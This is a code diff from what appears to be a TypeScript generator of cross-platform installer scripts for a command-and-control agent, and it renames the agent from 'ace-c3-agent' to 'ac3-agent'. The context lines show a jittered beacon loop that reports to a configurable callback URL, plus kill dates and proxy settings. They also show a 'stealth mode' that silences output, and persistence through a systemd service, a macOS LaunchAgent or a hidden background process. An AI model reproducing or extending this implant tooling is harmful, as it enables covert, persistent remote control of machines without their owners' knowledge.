@@ -149,7 +149,7 @@ REG_TOKEN="${config.registrationToken}"
 BEACON_INTERVAL=${config.beaconInterval}
 JITTER=${config.jitterPercent}
 PROTOCOL="${config.protocol}"
-AGENT_NAME="${config.agentName || "ace-c3-agent-$(hostname)"}"
+AGENT_NAME="${config.agentName || "ac3-agent-$(hostname)"}"
 WATCHDOG_SECONDS=${config.watchdogSeconds || config.beaconInterval * 3}
 ${config.killDate ? `KILL_DATE="${config.killDate}"` : "# No kill date set"}
 ${config.proxyUrl ? `PROXY_URL="${config.proxyUrl}"` : "# No proxy configured"}
@@ -186,7 +186,7 @@ install_deps() {
 
 # ─── Agent setup ───────────────────────────────────────────
 setup_agent() {
-  local AGENT_DIR="/opt/ace-c3-agent"
+  local AGENT_DIR="/opt/ac3-agent"
   mkdir -p "$AGENT_DIR"
 
   # Generate agent configuration
@@ -214,9 +214,9 @@ AGENT_CONFIG
 
 # ─── Beacon loop ───────────────────────────────────────────
 create_beacon_script() {
-  cat > /opt/ace-c3-agent/beacon.sh << 'BEACON_SCRIPT'
+  cat > /opt/ac3-agent/beacon.sh << 'BEACON_SCRIPT'
 #!/bin/bash
-CONFIG="/opt/ace-c3-agent/config.json"
+CONFIG="/opt/ac3-agent/config.json"
 while true; do
   AGENT_ID=$(python3 -c "import json; print(json.load(open('$CONFIG'))['agentId'])" 2>/dev/null || echo "unknown")
   CALLBACK=$(python3 -c "import json; print(json.load(open('$CONFIG'))['callbackUrl'])" 2>/dev/null)
@@ -249,21 +249,21 @@ print(json.dumps({
   sleep "$SLEEP_TIME"
 done
 BEACON_SCRIPT
-  chmod +x /opt/ace-c3-agent/beacon.sh
+  chmod +x /opt/ac3-agent/beacon.sh
   echo "[+] Beacon script created"
 }
 
 # ─── Systemd service (optional) ────────────────────────────
 install_service() {
   if [ "$(id -u)" -eq 0 ] && command -v systemctl &>/dev/null; then
-    cat > /etc/systemd/system/ace-c3-agent.service << SERVICE
+    cat > /etc/systemd/system/ac3-agent.service << SERVICE
 [Unit]
 Description=AC3 Security Agent
 After=network.target
 
 [Service]
 Type=simple
-ExecStart=/bin/bash /opt/ace-c3-agent/beacon.sh
+ExecStart=/bin/bash /opt/ac3-agent/beacon.sh
 Restart=always
 RestartSec=10
 ${config.stealthMode ? 'StandardOutput=null\nStandardError=null' : ''}
@@ -272,12 +272,12 @@ ${config.stealthMode ? 'StandardOutput=null\nStandardError=null' : ''}
 WantedBy=multi-user.target
 SERVICE
     systemctl daemon-reload
-    systemctl enable ace-c3-agent
-    systemctl start ace-c3-agent
+    systemctl enable ac3-agent
+    systemctl start ac3-agent
     echo "[+] Systemd service installed and started"
   else
     echo "[*] Starting beacon in background..."
-    nohup /opt/ace-c3-agent/beacon.sh &>/dev/null &
+    nohup /opt/ac3-agent/beacon.sh &>/dev/null &
     echo "[+] Beacon running as PID $!"
   fi
 }
@@ -312,7 +312,7 @@ $RegToken = "${config.registrationToken}"
 $BeaconInterval = ${config.beaconInterval}
 $Jitter = ${config.jitterPercent}
 $Protocol = "${config.protocol}"
-$AgentName = "${config.agentName || "ace-c3-agent-$env:COMPUTERNAME"}"
+$AgentName = "${config.agentName || "ac3-agent-$env:COMPUTERNAME"}"
 $WatchdogSeconds = ${config.watchdogSeconds || config.beaconInterval * 3}
 ${config.killDate ? `$KillDate = [DateTime]"${config.killDate}"` : "# No kill date set"}
 ${config.stealthMode ? '$StealthMode = $true' : '$StealthMode = $false'}
@@ -417,7 +417,7 @@ CALLBACK_URL="${config.callbackUrl}"
 REG_TOKEN="${config.registrationToken}"
 BEACON_INTERVAL=${config.beaconInterval}
 JITTER=${config.jitterPercent}
-AGENT_NAME="${config.agentName || "ace-c3-agent-$(hostname)"}"
+AGENT_NAME="${config.agentName || "ac3-agent-$(hostname)"}"
 
 echo "[*] AC3 Agent Installer v1.0 — macOS"
 echo "[*] Profile: ${config.profile}"
@@ -438,7 +438,7 @@ install_deps() {
 
 # ─── Agent setup ───────────────────────────────────────────
 setup_agent() {
-  local AGENT_DIR="$HOME/.ace-c3-agent"
+  local AGENT_DIR="$HOME/.ac3-agent"
   mkdir -p "$AGENT_DIR"
 
   cat > "$AGENT_DIR/config.json" << AGENT_CONFIG
@@ -478,7 +478,7 @@ install_launchagent() {
   <key>ProgramArguments</key>
   <array>
     <string>/bin/bash</string>
-    <string>$HOME/.ace-c3-agent/beacon.sh</string>
+    <string>$HOME/.ac3-agent/beacon.sh</string>
   </array>
   <key>RunAtLoad</key>
   <true/>
@@ -500,9 +500,9 @@ install_deps
 setup_agent
 
 # Create beacon script (same as Linux)
-cat > "$HOME/.ace-c3-agent/beacon.sh" << 'BEACON'
+cat > "$HOME/.ac3-agent/beacon.sh" << 'BEACON'
 #!/bin/bash
-CONFIG="$HOME/.ace-c3-agent/config.json"
+CONFIG="$HOME/.ac3-agent/config.json"
 while true; do
   CALLBACK=$(python3 -c "import json; print(json.load(open('$CONFIG'))['callbackUrl'])" 2>/dev/null)
   PAYLOAD=$(python3 -c "
@@ -527,7 +527,7 @@ print(json.dumps({
   sleep "$INTERVAL"
 done
 BEACON
-chmod +x "$HOME/.ace-c3-agent/beacon.sh"
+chmod +x "$HOME/.ac3-agent/beacon.sh"
 
 install_launchagent
 
@@ -553,18 +553,18 @@ export function generateInstaller(config: AgentInstallerConfig): InstallerOutput
     case "linux_x64":
     case "linux_arm64":
       script = generateLinuxInstaller(config);
-      filename = `ace-c3-agent-${config.profile}-linux.sh`;
+      filename = `ac3-agent-${config.profile}-linux.sh`;
       contentType = "application/x-sh";
       break;
     case "windows_x64":
       script = generateWindowsInstaller(config);
-      filename = `ace-c3-agent-${config.profile}-windows.ps1`;
+      filename = `ac3-agent-${config.profile}-windows.ps1`;
       contentType = "application/x-powershell";
       break;
     case "macos_x64":
     case "macos_arm64":
       script = generateMacOSInstaller(config);
-      filename = `ace-c3-agent-${config.profile}-macos.sh`;
+      filename = `ac3-agent-${config.profile}-macos.sh`;
       contentType = "application/x-sh";
       break;
     default:
